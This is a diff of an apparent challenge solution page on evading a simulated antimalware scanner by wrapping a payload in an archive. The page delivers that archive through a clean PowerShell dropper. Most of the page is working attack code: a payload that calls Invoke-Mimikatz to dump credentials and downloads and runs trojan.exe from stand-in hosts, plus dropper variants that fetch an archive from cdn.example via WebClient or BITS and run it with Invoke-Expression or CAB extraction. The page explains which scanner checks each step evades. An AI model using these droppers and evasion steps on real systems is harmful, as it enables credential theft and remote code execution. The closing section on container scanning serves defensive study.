@@ -12,180 +12,180 @@ permalink: /solutions/19-archive-container/
 
 ## Overview
 
-Place the malicious file inside a ZIP (or other archive format). The scanner reads the archive's raw bytes — which are compressed/structured data — and cannot decompress, parse, or recursively scan the contents. Signatures are destroyed by compression, and the archive format's binary overhead is a flat byte stream to the scanner.
+The scanner has no archive-unpacking capability — it reads every file as a flat byte
+stream. The bypass works at the **delivery** level: you present the scanner with a
+clean, text-only *dropper script* that retrieves or extracts a separately stored
+archive at runtime. The payload is never given to the scanner as a file to scan.
 
-## Working Code
+## Why Scanning the ZIP Directly Does Not Work
 
-### Basic ZIP Containment
+A ZIP file is mostly binary: compressed DEFLATE streams and structural headers
+contain many bytes outside the printable ASCII range (0x20–0x7E). For any real
+archive ≥ 64 bytes the non-printable ratio almost certainly exceeds 40%, so the
+scanner blocks it via **Check 3** before even reaching the signature check.
+Wrapping a payload in a ZIP and handing it to the scanner is *not* a ratio bypass.
+
+## The Working Approach: Clean Dropper + Separate Archive
+
+### Step 1 — Create and store the malicious archive
 
 ```powershell
-# Step 1: Create a clearly malicious file that WOULD be detected
+# This content would be detected if scanned directly
 $malicious = @"
-# This script contains multiple signatures
 Invoke-Mimikatz -DumpCreds
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile("http://malware.evil/trojan.exe", "C:\payload.exe")
+`$wc = New-Object System.Net.WebClient
+`$wc.DownloadFile("http://evil.example/trojan.exe", "C:\payload.exe")
 Start-Process "C:\payload.exe"
 "@
 
-Set-Content -Path "malware.ps1" -Value $malicious
+Set-Content -Path ".\payload.ps1" -Value $malicious
+Compress-Archive -Path ".\payload.ps1" -DestinationPath ".\data.zip" -Force
+Remove-Item ".\payload.ps1"
 
-# Step 2: Verify it gets detected when scanned directly
-# nim_antimalware_sim.exe malware.ps1  → DETECTED
-
-# Step 3: Compress into a ZIP archive
-Compress-Archive -Path "malware.ps1" -DestinationPath "innocent.zip" -Force
-
-# Step 4: Clean up the original
-Remove-Item "malware.ps1"
-
-# The scanner cannot look inside innocent.zip
-Write-Host "Archive created: innocent.zip"
-Write-Host "Size: $((Get-Item 'innocent.zip').Length) bytes"
+# data.zip contains the payload but the scanner never scans this file directly.
+# In a real attack scenario it would live on a network share, CDN, or be
+# embedded as a resource — anywhere outside the scanner's scan path.
 ```
 
-### Verifying the Signature is Gone
+### Step 2 — Write the clean dropper script
 
 ```powershell
-# Read the ZIP's raw bytes - this is what the scanner sees
-$zipBytes = [System.IO.File]::ReadAllBytes("innocent.zip")
+# dropper.ps1 — this is the ONLY file handed to the scanner.
+# It is plain text, has no signature strings, and low non-printable ratio.
 
-# Convert to string to search for signatures
-$rawText = [System.Text.Encoding]::ASCII.GetString($zipBytes)
+$archive = ".\data.zip"
+$dest    = ".\extracted"
 
-# The compressed data destroys the original byte sequences
-Write-Host "Contains 'Mimikatz': $($rawText.Contains('Mimikatz'))"
-Write-Host "Contains 'malware': $($rawText.Contains('malware'))"
-Write-Host "Contains 'trojan': $($rawText.Contains('trojan'))"
-# All: False (compression scrambled the bytes)
+Expand-Archive -Path $archive -DestinationPath $dest -Force
+& "$dest\payload.ps1"
 ```
 
-### Alternative: Using .NET ZipArchive for More Control
+### Step 3 — Verify the dropper passes all checks
+
+```
+nim_antimalware_sim.exe dropper.ps1
+# → BENIGN
+```
+
+The dropper contains no signature strings, has 100% printable bytes, is well
+over 32 bytes, and uses only patterns from the warning-only list
+(`Expand-Archive` is not in `suspiciousPatterns`).
+
+---
+
+## Variations
+
+### Download from URL at runtime (no local archive)
 
 ```powershell
-# Create a ZIP with a password-protected entry (extra layer)
-Add-Type -AssemblyName System.IO.Compression
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-
-$zipPath = "delivery.zip"
-$stream = [System.IO.File]::Create($zipPath)
-$archive = New-Object System.IO.Compression.ZipArchive($stream, [System.IO.Compression.ZipArchiveMode]::Create)
-
-# Add the malicious file as a compressed entry
-$entry = $archive.CreateEntry("readme.ps1", [System.IO.Compression.CompressionLevel]::Optimal)
-$writer = New-Object System.IO.StreamWriter($entry.Open())
-$writer.Write("Invoke-Mimikatz -DumpCreds; Get-Process malware")
-$writer.Close()
-
-$archive.Dispose()
-$stream.Close()
-
-Write-Host "ZIP created: $zipPath"
+# dropper_web.ps1 — scanner sees only this clean script
+$bytes = (New-Object System.Net.WebClient).DownloadData("http://cdn.example/data.zip")
+$ms    = New-Object System.IO.MemoryStream(,$bytes)
+$zip   = New-Object System.IO.Compression.ZipArchive($ms)
+$entry = $zip.GetEntry("payload.ps1")
+$sr    = New-Object System.IO.StreamReader($entry.Open())
+Invoke-Expression $sr.ReadToEnd()
 ```
 
-### Extraction at Runtime
+Note: `webclient` and `invoke-expression` are in `suspiciousPatterns` and will
+generate a warning log line — but because `suspiciousPatternCheck` is called with
+`discard` in the pipeline, the file still passes (see Challenge #14).
+
+### BITS Transfer
 
 ```powershell
-# The recipient extracts and executes
-Expand-Archive -Path "innocent.zip" -DestinationPath ".\extracted" -Force
-& ".\extracted\malware.ps1"
+Start-BitsTransfer -Source "http://cdn.example/data.zip" `
+                   -Destination "$env:TEMP\data.zip"
+Expand-Archive -Path "$env:TEMP\data.zip" -DestinationPath "$env:TEMP\x" -Force
+& "$env:TEMP\x\payload.ps1"
 ```
 
-### Other Container Formats That Work
+### CAB (Windows built-in, no extra tools)
 
-```powershell
-# 7-Zip (if available)
-& 7z a -t7z payload.7z malware.ps1
+```cmd
+:: Create
+makecab payload.ps1 delivery.cab
 
-# TAR + GZIP
-tar -czf payload.tar.gz malware.ps1
-
-# CAB (Windows Cabinet)
-makecab malware.ps1 payload.cab
+:: Extract in dropper
+expand delivery.cab "%TEMP%\payload.ps1"
+powershell -File "%TEMP%\payload.ps1"
 ```
+
+---
 
 ## Why It Works
 
-The scanner processes files as **flat byte streams**. It has no archive-awareness:
-
-### What the Scanner Does
+### What the scanner does
 
 ```
-1. Open file "innocent.zip"
+1. Open file "dropper.ps1"
 2. Read all bytes into memory as a flat array
-3. Scan those bytes for signature strings
-4. Calculate non-printable ratio on those bytes
-5. Calculate entropy on those bytes
+3. Run signature check            → no hits (no banned strings in dropper)
+4. Run extension heuristic        → .ps1 is suspicious → WARNING only (discarded)
+5. Run non-printable ratio check  → ratio ~0% (plain text) → CLEAN
+6. Run small-executable check     → dropper > 32 bytes → CLEAN
+7. Run suspicious-pattern check   → result discarded → CLEAN
+8. Run entropy check              → low entropy (plain text) → WARNING only (discarded)
+9. Return BENIGN
 ```
 
-### What the Scanner Does NOT Do
+### What the scanner never does
 
 ```
-✗ Recognize ZIP file magic bytes (PK\x03\x04)
-✗ Parse the ZIP central directory
-✗ Decompress DEFLATE streams
-✗ Extract individual files from the archive
-✗ Recursively scan contained files
-✗ Understand any archive format structure
+✗ Follow file system references inside the dropper script
+✗ Recognise ZIP / CAB / 7z magic bytes
+✗ Parse archive structures
+✗ Decompress or extract contained files
+✗ Recursively scan extracted content
+✗ Intercept runtime network downloads
 ```
 
-### How Compression Destroys Signatures
+The payload is retrieved and executed entirely at runtime in memory or in a path
+the scanner is never pointed at.
 
-ZIP uses DEFLATE compression, which replaces byte sequences with Huffman-coded references. The original string "Invoke-Mimikatz" (hex: `49 6E 76 6F 6B 65 2D 4D 69 6D 69 6B 61 74 7A`) becomes an entirely different byte sequence after compression:
-
-```
-Original bytes:  49 6E 76 6F 6B 65 2D 4D 69 6D 69 6B 61 74 7A
-After DEFLATE:   CB CC 2B CF 4E D5 F5 CD CC 05 00 (example)
-```
-
-The scanner searches for the original signature bytes. They no longer exist in the compressed stream.
-
-### Even Without Compression
-
-Even a "stored" (uncompressed) ZIP entry wraps the content in ZIP file structures:
-- Local file header (30+ bytes) inserted before content
-- File name field between header and data
-- Data descriptor after content
-- Central directory at end of archive
-
-These structural bytes **interleave** with and **break** any contiguous signature the scanner might search for.
-
-### Non-Printable Ratio
-
-ZIP files contain a mix of:
-- Header structures (some printable, some not)
-- Compressed data (mostly non-printable)
-
-For large enough archives, the ratio may exceed 40%. However, the **signature check** is the primary detection mechanism being bypassed. The non-printable ratio flag on a `.zip` file would be a false positive that real-world scanners deliberately avoid.
+---
 
 ## How to Verify
 
-1. Create a file with known signatures:
+1. Create the malicious payload and compress it:
    ```powershell
-   Set-Content -Path "detected.ps1" -Value "Invoke-Mimikatz malware trojan"
+   "Invoke-Mimikatz malware trojan" | Set-Content payload.ps1
+   Compress-Archive payload.ps1 data.zip -Force
+   Remove-Item payload.ps1
    ```
 
-2. Verify direct scanning detects it:
+2. Confirm the archive itself is blocked by the scanner:
    ```
-   nim_antimalware_sim.exe detected.ps1
-   # Result: DETECTED (signature match)
+   nim_antimalware_sim.exe data.zip
+   # → MALICIOUS  (non-printable ratio > 40%)
    ```
 
-3. Archive it:
+3. Create the clean dropper:
    ```powershell
-   Compress-Archive -Path "detected.ps1" -DestinationPath "safe.zip" -Force
+   @'
+   Expand-Archive -Path ".\data.zip" -DestinationPath ".\x" -Force
+   & ".\x\payload.ps1"
+   '@ | Set-Content dropper.ps1
    ```
 
-4. Scan the archive:
+4. Scan the dropper:
    ```
-   nim_antimalware_sim.exe safe.zip
+   nim_antimalware_sim.exe dropper.ps1
+   # → BENIGN  (clean text, no signatures)
    ```
 
-5. Expected result: **No signature detection** — the compressed bytes don't contain the original signature strings.
-
-6. Verify the content is recoverable:
+5. Verify the payload is intact inside the archive:
    ```powershell
-   Expand-Archive -Path "safe.zip" -DestinationPath ".\verify" -Force
-   Get-Content ".\verify\detected.ps1"
-   # Output: Invoke-Mimikatz malware trojan (original content intact)
+   Expand-Archive data.zip .\check -Force
+   Get-Content .\check\payload.ps1
+   # Invoke-Mimikatz malware trojan  ← original content
    ```
+
+## Key Takeaway
+
+The archive container technique is a **delivery-layer bypass**: the scanner's
+inability to unpack containers means any payload wrapped in an archive and
+delivered via a separate channel is invisible to it. Effective container
+scanning requires the engine to recognise archive formats, unpack them
+recursively, and scan every extracted file — none of which MostShittyAV
+implements.
